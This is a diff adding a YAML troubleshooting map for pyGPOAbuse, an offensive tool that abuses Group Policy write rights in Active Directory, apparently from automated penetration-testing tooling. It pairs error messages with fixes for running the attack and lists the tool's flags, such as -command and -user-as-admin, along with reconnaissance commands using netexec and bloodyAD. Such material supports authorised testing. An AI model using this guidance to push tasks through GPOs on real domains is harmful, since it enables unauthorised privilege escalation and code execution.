+    remediation: "SMB succeeded but SYSVOL write was denied — the auth user lacks WRITE permission on `\\\\<DC>\\SYSVOL\\<domain>\\Policies\\{<GPO-GUID>}\\`. Note: GPO container LDAP-side rights (GenericAll/GenericWrite) do NOT imply SYSVOL ACL. Check SYSVOL ACL via `netexec smb <DC> -u <user> -p <pass> -M smbloginchecks` or use a different GPO with confirmed SYSVOL write."
+  - signal: "STATUS_INVALID_HANDLE"
+    remediation: "SMB handle invalidated mid-write — usually a transient network blip or signing mismatch. Retry; if persistent, try -ldaps + verify VPN tunnel stability."
+  - signal: "Wrong hash format"
+    remediation: "pyGPOAbuse rejected the -hashes value. Form MUST be `LMHASH:NTHASH` or `:NTHASH` (with leading colon for empty LM). Bare NTHASH without colon → this error. Example: `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0`."
+  - signal: "Domain should be specified"
+    remediation: "Credential blob missing the `domain/` prefix. Form MUST be `domain/user[:password]` — bare `user:password` is rejected. Add the domain part (e.g., `corp.local/jdoe:hunter2`)."
+  - signal: "Could not find a GPO named"
+    remediation: "-gpo-name LDAP resolution failed — no groupPolicyContainer object with that displayName exists, OR the auth user lacks LDAP read on the GPO branch. Verify the exact GPO name with `bloodyAD ... get search --filter '(objectClass=groupPolicyContainer)' --attr displayName,name`. If the name has special chars, switch to -gpo-id with the GUID."
+  - signal: "doesn't seem to have the necessary rights"
+    remediation: "pyGPOAbuse's pre-flight ACL check found the auth user lacks GenericAll/GenericWrite/WriteDacl on the GPO container. Verify with `bloodyAD ... get writable --otype GPO` or BloodHound. The user may have inherited rights through a group — re-check with effective access."
+  - signal: "permission denied"
+    remediation: "Generic permission failure — check both LDAP-side (GenericAll on GPO container) AND SMB-side (write on SYSVOL\\Policies\\{<GUID>}) ACLs. They are separate. Use `netexec smb <DC> -u <user> -p <pass> --shares` to verify SYSVOL write."
+  - signal: "not authorized"
+    remediation: "LDAP bind succeeded but operation rejected. Same root as 'permission denied'. The user's effective GPO permissions don't include the required write right."
+  - signal: "Error while updating versions"
+    remediation: "GPO version-number bump (gPCMachineExtensionNames + versionNumber) failed at LDAP layer — typically because of insufficientAccessRights on the GPO container's gPCMachineExtensionNames attribute. Re-check effective permissions with `bloodyAD get writable`, OR the modify is blocked by AdminSDHolder reset (if the GPO is protected). Run with -vv for the specific LDAP error code."
+  - signal: "Error while cleaning"
+    remediation: "--cleanup failed at the rollback step. Common causes: the original task was already removed manually; the GPO version was reset by another tool; SYSVOL write rejected. Re-run with -vv. Manual cleanup: SMB-delete the ScheduledTasks.xml under `\\\\<DC>\\SYSVOL\\<domain>\\Policies\\{<GUID>}\\Machine\\Preferences\\ScheduledTasks\\`."
+  - signal: "Unable to connect"
+    remediation: "Generic connection failure — read prior lines for the specific layer. Common: DNS, TCP refused/reset, SMB negotiation failure (signing mismatch). Try -ldaps for LDAPS path."
+  - signal: "Does not exist"
+    remediation: "Target object (GPO container, OU, computer) not found in AD. Verify the GUID with `bloodyAD ... get search --filter '(objectClass=groupPolicyContainer)'` or BloodHound. CASE matters for some attribute comparisons."
+  - signal: "KRB_AP_ERR_SKEW"
+    remediation: "Clock skew >5 min between container and DC. The pygpoabuse image has libfaketime baked in (entrypoint.sh wires FAKETIME from clock_offset). Verify libfaketime survived the python3-full Dockerfile fix. Alternatively: run nmap to detect DC time and adjust container clock manually."
+  - signal: "Clock skew too great"
+    remediation: "Synonym for KRB_AP_ERR_SKEW — Kerberos AP_REQ rejected for time difference. Same fix: FAKETIME via libfaketime."
+  - signal: "KDC_ERR_PREAUTH_FAILED"
+    remediation: "Kerberos pre-auth failed — wrong password / hash / AES key. With -k, the ccache is invalid or for a different user. Verify ccache validity with `klist -c <ccache>` or `impacket-getTGT` to refresh."
+  - signal: "ccache required"
+    remediation: "-k was passed without -ccache. pyGPOAbuse requires the explicit ccache path (does NOT consult KRB5CCNAME env). Add `-ccache /session/credentials/<user>.ccache`."
+  - signal: "argument required"
+    remediation: "argparse — missing required positional or flag. Common: missing the credential blob first positional, missing -gpo-id / -gpo-name, or missing -command (for scheduled task creation). Read the specific arg name in the error."
+  - signal: "unrecognized arguments"
+    remediation: "argparse — unknown flag. CHECK DASHES: pyGPOAbuse uses SINGLE-DASH long form for most flags (-gpo-id, -dc-ip, -hashes, -taskname). Common mistake: typing --gpo-id (double dash) instead of -gpo-id. Exception: --cleanup is double-dash."
+  - signal: "one of the arguments"
+    remediation: "argparse mutually exclusive group violation — typically -gpo-id and -gpo-name supplied together (mutually exclusive) OR neither supplied (one is required). Pass exactly one."
+  - signal: "not allowed with argument"
+    remediation: "argparse — incompatible flags supplied together. Common: -gpo-id and -gpo-name at the same time."
+
+help_commands:
+  - command: "pygpoabuse --help"
+    purpose: "Top-level help — lists global flags (-gpo-id / -gpo-name / -dc-ip / -hashes / -k / -ccache / -ldaps / -taskname / -mod-date / -description / -command / -powershell / -user / -user-as-admin / -f / -v / --cleanup) and the credential blob positional"
+  - command: "pygpoabuse -h"
+    purpose: "Short alias for --help"
+
